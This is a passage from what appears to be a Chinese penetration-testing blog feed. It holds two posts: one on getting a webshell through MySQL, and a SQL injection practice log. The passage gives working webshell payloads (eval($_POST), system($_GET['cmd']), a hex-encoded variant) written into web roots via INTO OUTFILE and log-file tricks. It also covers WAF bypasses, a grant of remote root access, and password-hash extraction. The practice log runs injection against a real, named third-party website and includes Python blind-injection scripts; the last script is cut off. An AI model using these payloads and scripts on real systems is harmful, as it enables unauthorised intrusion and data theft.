Variable_name    | Value                               |</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">| general_log      | ON                                  |</span><br><span class="line">| general_log_file | &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;ip-172-31-31-147.log |</span><br><span class="line">+------------------+-------------------------------------+</span><br></pre></td></tr></table></figure><p>修改日志文件路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET global general_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;cmd.php&#39;;</span><br></pre></td></tr></table></figure><p>插入一句话shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="堆叠注入配合日志上传shell"><a href="#堆叠注入配合日志上传shell" class="headerlink" title="堆叠注入配合日志上传shell"></a>堆叠注入配合日志上传shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\wwwroot\\web\\shell.php&#39;;#</span><br><span class="line">id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;#</span><br></pre></td></tr></table></figure><h3 id="sqlmap常见使用参数"><a href="#sqlmap常见使用参数" class="headerlink" title="sqlmap常见使用参数"></a>sqlmap常见使用参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-v 显示pyload</span><br><span class="line">--os-shell</span><br><span class="line">--sql-shell</span><br><span class="line">--is-dba</span><br><span class="line">--os-cmd&#x3D;</span><br><span class="line">--data 以post参数提交数据</span><br><span class="line">--user-agent&#x3D;“” 随机浏览器头</span><br><span class="line">-search -C  username,password,admin 快速搜索数据库中的字段</span><br><span class="line">sqlmap -u &quot;url&quot; --file-write&#x3D;本地文件路径 --file-dest&#x3D;网站的绝对路径 &#x2F;&#x2F;上传webshell用，需要dba权限</span><br><span class="line">sqlmap -u &quot;url&quot; –file-read&#x3D; &#x2F;&#x2F;这个读取的文件会存在本地的结果目录，请认真看提示</span><br><span class="line">sqlmap -u &quot;url&quot; --os-cmd &quot;cmd&quot;  &#x2F;&#x2F;执行cmd代表的命令，如cd C:&#x2F;</span><br></pre></td></tr></table></figure><h3 id="mysql密码的获取"><a href="#mysql密码的获取" class="headerlink" title="mysql密码的获取"></a>mysql密码的获取</h3><ul><li><p>常见CMS数据库配置文件</p><p>比如：Discuz的config/config_global_default.php、config /config_ucenter.php、config.inc.php。</p></li><li><p>对于操作系统，linux会存在于./root/.mysql_history、./root/.bash_history文件。</p></li><li><p>文件查找</p><p>有关用户一共有三个文件即user.frm、user.MYD和 user.MYI，MYSQL数据库用户密码都保存在user.MYD文件中，包括root用户和其他用户的密码。在有权限的情况下，我们可以将User.frm、user.myd和User.myi三个文件下载到本地，通过本地的mysql环境直接读取user表中的数据。当然也可使用文本编辑器将user.MYD打开将root账号的密码复制出来到到cmd5.com进行查询和破解。</p></li><li><p>直接使用命令查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. select user,password from mysql.user;</span><br><span class="line">2. select user,password from mysql.user where user &#x3D;&#39;root&#39;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="phpadmin后台获取shell"><a href="#phpadmin后台获取shell" class="headerlink" title="phpadmin后台获取shell"></a>phpadmin后台获取shell</h2><h3 id="利用数据库表导出webshell"><a href="#利用数据库表导出webshell" class="headerlink" title="利用数据库表导出webshell"></a>利用数据库表导出webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create TABLE webshell (content text NOT <span class="literal">NULL</span>);</span><br><span class="line">Insert INTO webshell (content) VALUES(<span class="string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span>);</span><br><span class="line">select content <span class="keyword">from</span> webshell into outfile <span class="string">&#x27;C:\\phpStudy\\WWW\\webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">DROP TABLE <span class="keyword">IF</span> EXISTS `webshell`;</span><br></pre></td></tr></table></figure><h3 id="常规语句导出webshell"><a href="#常规语句导出webshell" class="headerlink" title="常规语句导出webshell"></a>常规语句导出webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span> into outfile <span class="string">&#x27;c:/phpstudy/www/webshell.php&#x27;</span>;  </span><br><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span> into outfile <span class="string">&#x27;c:\\phpstudy\\www\\web.php&#x27;</span>;</span><br><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span> into dumpfile <span class="string">&#x27;c:\\phpstudy\\www\\web.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">select <span class="string">&#x27;&lt;?php echo \&#x27;&lt;pre&gt;\&#x27;;system($_GET[\&#x27;cmd\&#x27;]); echo \&#x27;&lt;/pre&gt;\&#x27;; ?&gt;&#x27;</span> into outfile <span class="string">&#x27;C:\\phpStudy\\WWW\\webshell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="日志文件爆出shell"><a href="#日志文件爆出shell" class="headerlink" title="日志文件爆出shell"></a>日志文件爆出shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">global</span> variables like <span class="string">&quot;%genera%&quot;</span>;                      <span class="comment">//查询general_log配置</span></span><br><span class="line">set <span class="keyword">global</span> general_log=<span class="string">&#x27;on&#x27;</span>;                                <span class="comment">//开启general log模式</span></span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">&#x27;C:/phpStudy/WWW/web.php&#x27;</span>;      <span class="comment">//设置日志文件保存路径</span></span><br><span class="line">SELECT <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;                                <span class="comment">//phpinfo()写入日志文件</span></span><br><span class="line">set <span class="keyword">global</span> general_log=<span class="string">&#x27;off&#x27;</span>;                               <span class="comment">//关闭general_log模式</span></span><br></pre></td></tr></table></figure><h3 id="slow-query-log-file获取shell"><a href="#slow-query-log-file获取shell" class="headerlink" title="slow_query_log_file获取shell"></a>slow_query_log_file获取shell</h3><p>慢查询日志文件路径 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;slow_query_log_file&#x27;</span>;</span><br><span class="line">set <span class="keyword">global</span> slow_query_log=on;</span><br><span class="line">set <span class="keyword">global</span> slow_query_log_file=<span class="string">&quot;C:\\phpStudy\\WWW\\shell.php&quot;</span>;</span><br><span class="line">select sleep(<span class="number">15</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line">set <span class="keyword">global</span> slow_query_log=off;</span><br></pre></td></tr></table></figure><p>利用general_log或slow_query_log在成功写入Webshel后建议立即OFF关闭，否则可能会因为php.ini配置文件中的memory_limit参数设定的内存值太小而出现“内存不足”的报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Allowed memory size of 16777216 bytes exhausted (tried to allocate 16777216 bytes) in &#x2F;data&#x2F;home&#x2F;arco&#x2F;www&#x2F;funn&#x2F;index.php on line 234</span><br></pre></td></tr></table></figure><h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><h4 id="开启外链"><a href="#开启外链" class="headerlink" title="开启外链"></a>开启外链</h4><p>开启外链来执行导出Webshell的SQL语句，因为这样走的不是POST、GET方式，所以这样执行SQL语句是不会被WAF拦截的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; with grant option;    &#x2F;&#x2F;开启MySQL外链flush privileges;                          &#x2F;&#x2F;刷新MySQL系统权限相关表</span><br></pre></td></tr></table></figure><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e</span> into outfile <span class="string">&#x27;C:\\phpStudy\\WWW\\webshell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="常见报错"><a href="#常见报错" class="headerlink" title="常见报错"></a>常见报错</h3><ul><li><p><code>secure_file_priv</code>限制</p><p>在my.ini、my.cnf、mysqld.cnf文件中找到secure_file_prive并将其值设置为空””或斜杠”/“，然后重启MySQL服务即可。</p></li><li><p>权限不足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> (using password: YES) </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> mysql.user;                                <span class="comment">//查询所有用户权限</span></span><br><span class="line">select * <span class="keyword">from</span> mysql.user where user=<span class="string">&quot;root&quot;</span>;              <span class="comment">//查询root用户权限</span></span><br><span class="line">update user set File_priv =<span class="string">&#x27;Y&#x27;</span> where user = <span class="string">&#x27;root&#x27;</span>;      <span class="comment">//允许root用户读写文件</span></span><br><span class="line">update user set File_priv =<span class="string">&#x27;N&#x27;</span> where user = <span class="string">&#x27;root&#x27;</span>;      <span class="comment">//禁止root用户读写文件</span></span><br><span class="line">flush privileges</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;渗透测试–shell获取&quot;&gt;&lt;a href=&quot;#渗透测试–shell获取&quot; class=&quot;headerlink&quot; title=&quot;渗透测试–shell获取&quot;&gt;&lt;/a&gt;渗透测试–shell获取&lt;/h1&gt;&lt;h2 id=&quot;sql注入获取shell&quot;&gt;&lt;a href=&quot;#s</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--SQL注入漏洞手注练习</title>
    <link href="http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E6%B3%A8%E7%BB%83%E4%B9%A0/"/>
    <id>http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E6%B3%A8%E7%BB%83%E4%B9%A0/</id>
    <published>2020-10-23T13:21:43.000Z</published>
    <updated>2020-11-23T03:36:56.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入漏洞手注练习"><a href="#SQL注入漏洞手注练习" class="headerlink" title="SQL注入漏洞手注练习"></a>SQL注入漏洞手注练习</h1><h2 id="Exp1"><a href="#Exp1" class="headerlink" title="Exp1"></a>Exp1</h2><h3 id="判断字符、数字型、闭合方式"><a href="#判断字符、数字型、闭合方式" class="headerlink" title="判断字符、数字型、闭合方式"></a>判断字符、数字型、闭合方式</h3><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890%27</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><p>正常回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890%27--+</span><br></pre></td></tr></table></figure><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><h4 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h4><p>正常回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; order by 6-- </span><br></pre></td></tr></table></figure><p>输出错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; order by 7-- </span><br></pre></td></tr></table></figure><p>判断字段数量为6。</p><h4 id="回显显示位"><a href="#回显显示位" class="headerlink" title="回显显示位"></a>回显显示位</h4><p>WAF拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union select 1,2,3,4,5,6-- </span><br></pre></td></tr></table></figure><p>拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union select-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; select-- </span><br></pre></td></tr></table></figure><p>不拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union sel&#x2F;**&#x2F;ect-- </span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union sele&#x2F;**&#x2F;ct 1,2,3,4,5,6-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>WAF拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; and updatexml(0,concat(0x7e,database(),0x7e),0)-- </span><br></pre></td></tr></table></figure><p>WAF不拦截但是报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; and updat&#x2F;**&#x2F;exml(0,co&#x2F;**&#x2F;ncat(0x7e,database(),0x7e),0)-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>页面正常回显。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; and if(length(database())&#x3D;13,1,0)-- </span><br></pre></td></tr></table></figure><h4 id="延时注入POC"><a href="#延时注入POC" class="headerlink" title="延时注入POC"></a>延时注入POC</h4><h5 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_len</span>(<span class="params">url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;开始判断数据库的长度————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    max_length=<span class="number">15</span></span><br><span class="line">    database_length=harf_find(min_length,max_length,url)</span><br><span class="line">    print(<span class="string">&quot;数据库的长度为：&quot;</span>+str(database_length))</span><br><span class="line">    print(<span class="string">&quot;数据库长度判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        print(mid_value)</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(length(database())&gt;%d,1,0)--+&quot;</span>%mid_value</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line"><span class="comment">#        time.sleep(10)</span></span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    database_length_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(length(database())&gt;%d,1,0)--+&quot;</span></span><br><span class="line">    get_database_len(database_length_url)</span><br></pre></td></tr></table></figure><h5 id="判断数据库名字"><a href="#判断数据库名字" class="headerlink" title="判断数据库名字"></a>判断数据库名字</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_data</span>(<span class="params">url,database_length,payload</span>):</span></span><br><span class="line">    database_name=<span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;开始判断数据库的名字————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    max_length=<span class="number">126</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,database_length):</span><br><span class="line">        payload=<span class="string">&quot;&#x27; and if(ascii(substr(database(),%d,1))&gt;&quot;</span>%i</span><br><span class="line">        database_name+=chr(harf_find(min_length,max_length,url,payload))</span><br><span class="line">    print(<span class="string">&quot;数据库的名字为：&quot;</span>+database_name)</span><br><span class="line">    print(<span class="string">&quot;数据库名字判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url,payload</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890%s%d,1,0)--+&quot;</span>%(payload,mid_value)</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    database_data_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&quot;</span></span><br><span class="line">    payload=<span class="string">&quot;&#x27; and if(ascii(substr(database(),%d,1))&gt;&quot;</span></span><br><span class="line">    database_length=<span class="number">13</span></span><br><span class="line">    get_database_data(database_data_url,database_length,payload)</span><br></pre></td></tr></table></figure><h5 id="判断表的长度"><a href="#判断表的长度" class="headerlink" title="判断表的长度"></a>判断表的长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf_analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//head/title/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span>(<span class="params">url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;开始判断表的长度————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    